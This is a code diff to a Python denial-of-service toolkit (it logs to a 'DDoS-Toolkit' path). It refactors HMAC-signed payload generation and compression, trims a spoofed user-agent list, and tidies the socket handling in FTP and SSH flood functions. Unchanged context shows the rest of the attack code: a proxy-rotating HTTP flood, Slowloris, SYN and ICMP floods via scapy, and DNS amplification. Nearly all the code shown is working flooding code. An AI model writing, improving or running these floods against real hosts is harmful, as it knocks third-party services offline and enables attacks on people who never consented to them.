@@ -66,6 +66,7 @@ import scapy.all as scapy  # Install module with pip scapy --break-system-packag
 import dns.resolver  # Install module with pip dnspython --break-system-packages
 from colorama import init, Fore, Style  # Install module with pip colorama --break-system-packages
 from tqdm import tqdm  # Install module with pip tqdm --break-system-packages
+from typing import Optional
 
 # Initialize colorama for colorized terminal output
 init(autoreset=True)
@@ -118,31 +119,18 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36 Edge/17.17134",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL Build/PQ2A.190505.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 8.1.0; SM-G960F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; rv:41.0) Gecko/20100101 Firefox/41.0",
-    "Mozilla/5.0 (Linux; Android 7.0; Nexus 6P Build/NPG05D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 5.1; SM-G530H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Mobile Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Edge/75.0.139.20"
 ]
 
 HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]
 
-# Logging setup
+# Set up logging configuration
 logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler('/opt/DDoS-Toolkit/logs/load_test.log'),
-        logging.StreamHandler()
-    ]
+    level=logging.INFO,  # Set logging level to INFO or DEBUG as needed
+    format='%(asctime)s - %(levelname)s - %(message)s',  # Define the log format
+    handlers=[logging.StreamHandler()]  # Print logs to the console
 )
+
+logger = logging.getLogger(__name__)  # Create a logger for this module
 
 def display_banner():
     print(f"""
@@ -258,31 +246,64 @@ async def monitor_proxy_health(proxies):
                 proxies.remove(proxy)
                 print(f"Removed unhealthy proxy: {proxy}")
         await asyncio.sleep(60)  # Check every 60 seconds
+        
+def generate_payload(payload_type: str, secret_key: Optional[bytes] = None) -> Optional[bytes]:
+    
+    if secret_key is None:
+        secret_key = os.getenv("SECRET_KEY", b"your_default_secret_key")  # Load from environment or default
+    
+    try:
+        # Generate unique payload identifier
+        payload_id = str(uuid4())
+        data = b64encode(os.urandom(64)).decode()
+        
+        # Create the payload dictionary
+        payload = {"id": payload_id, "data": data}
+        
+        # Sign the payload using HMAC and SHA-256
+        payload_str = json.dumps(payload, separators=(',', ':'))
+        signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
+        payload["signature"] = signature
+        
+        # Log the generated signature for debugging
+        logger.debug(f"Generated signature: {signature}")
 
-def generate_payload(payload_type: str):
-    """Generate a payload for HTTP requests."""
-    payload_id = str(uuid4())
-    data = b64encode(os.urandom(64)).decode()
-    payload = {"id": payload_id, "data": data}
-
-    # Sign the payload using HMAC
-    secret_key = b"your_secret_key"  # Replace with a secure key
-    payload_str = json.dumps(payload)
-    signature = hmac.new(secret_key, payload_str.encode(), hashlib.sha256).hexdigest()
-    payload["signature"] = signature
-
-    # Compress the payload using zlib
-    if payload_type == "json":
-        compressed_payload = zlib.compress(json.dumps(payload).encode())
+        # Compress the payload based on the selected type
+        if payload_type == "json":
+            compressed_payload = compress_payload(json.dumps(payload).encode())
+        elif payload_type == "xml":
+            # Create XML-formatted payload
+            xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
+            compressed_payload = compress_payload(xml_payload.encode(), compression_type="gzip")  # Optionally use gzip
+        elif payload_type == "form":
+            # Return uncompressed payload as form data (as dictionary)
+            return json.dumps(payload).encode()  # Form could be raw JSON or custom
+        else:
+            logger.error(f"Invalid payload type: {payload_type}")
+            return None
+        
         return compressed_payload
-    elif payload_type == "xml":
-        xml_payload = f"<data><id>{payload_id}</id><value>{data}</value><signature>{signature}</signature></data>"
-        compressed_payload = zlib.compress(xml_payload.encode())
-        return compressed_payload
-    elif payload_type == "form":
-        return payload
-    else:
+    except Exception as e:
+        logger.error(f"Error generating payload: {e}")
         return None
+
+
+def compress_payload(data: bytes, compression_type: str = "zlib") -> bytes:
+    
+    try:
+        if compression_type == "gzip":
+            # Gzip compression
+            compressed_data = gzip.compress(data)
+            logger.debug(f"Compressed using gzip: {len(compressed_data)} bytes")
+        else:
+            # Default to zlib compression
+            compressed_data = zlib.compress(data)
+            logger.debug(f"Compressed using zlib: {len(compressed_data)} bytes")
+        
+        return compressed_data
+    except Exception as e:
+        logger.error(f"Error compressing data: {e}")
+        return data  # Return uncompressed data if compression fails
 
 def run_network_scanner(target_ip):
     """Run the netscan script with enhanced error handling and validation."""
@@ -391,7 +412,7 @@ def is_valid_ip(ip: str):
         return False
 
 async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, payload_type="json", retry=3):
-    """Perform a rate-limited attack."""
+    
     global requests_sent, successful_requests, failed_requests, last_time
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -432,7 +453,7 @@ async def rate_limited_attack(target_url, stop_event, pause_time, rate_limit, pr
                 await asyncio.sleep(pause_time)
 
 async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxies=None, headers=None, retry=3):
-    """Perform a Slowloris attack by keeping many connections open."""
+
     global requests_sent, successful_requests, failed_requests
     proxy_pool = cycle(proxies) if proxies else None
     semaphore = asyncio.Semaphore(rate_limit)
@@ -467,8 +488,9 @@ async def slowloris_attack(target_url, stop_event, pause_time, rate_limit, proxi
                         logging.error(f"Unexpected error during request (attempt {attempt + 1}): {e}")
                 await asyncio.sleep(pause_time)
 
+
 def syn_flood(target_ip, target_port, duration):
-    """Perform a SYN flood attack using scapy."""
+    
     print(f"Starting SYN flood attack on {target_ip}:{target_port} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
@@ -483,8 +505,9 @@ def syn_flood(target_ip, target_port, duration):
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
     print("SYN flood attack completed.")
 
+
 def icmp_flood(target_ip, duration):
-    """Perform an ICMP flood attack using scapy."""
+    
     print(f"Starting ICMP flood attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
@@ -497,8 +520,8 @@ def icmp_flood(target_ip, duration):
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
     print("ICMP flood attack completed.")
 
+
 async def dns_amplification(target_ip, duration):
-    """Perform a DNS amplification attack."""
     print(f"Starting DNS amplification attack on {target_ip} for {duration} seconds...")
     start_time = time.time()
     while time.time() - start_time < duration:
@@ -510,7 +533,7 @@ async def dns_amplification(target_ip, duration):
             print(f"Error during DNS amplification: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
     print("DNS amplification attack completed.")
-
+    
 def ftp_flood(target_ip, target_port, duration):
     """Perform an FTP flood attack."""
     print(f"Starting FTP flood attack on {target_ip}:{target_port} for {duration} seconds...")
@@ -518,11 +541,10 @@ def ftp_flood(target_ip, target_port, duration):
     while time.time() - start_time < duration:
         try:
             # Create a socket and connect to the target FTP server
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target_ip, target_port))
-            # Send a random payload
-            sock.send(os.urandom(1024))
-            sock.close()
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect((target_ip, target_port))
+                # Send a random payload
+                sock.send(os.urandom(1024))
         except Exception as e:
             print(f"Error during FTP flood: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
@@ -535,11 +557,10 @@ def ssh_flood(target_ip, target_port, duration):
     while time.time() - start_time < duration:
         try:
             # Create a socket and connect to the target SSH server
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((target_ip, target_port))
-            # Send a random payload
-            sock.send(os.urandom(1024))
-            sock.close()
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.connect((target_ip, target_port))
+                # Send a random payload
+                sock.send(os.urandom(1024))
         except Exception as e:
             print(f"Error during SSH flood: {e}")
         time.sleep(0.01)  # Adjust the sleep time to control the attack rate
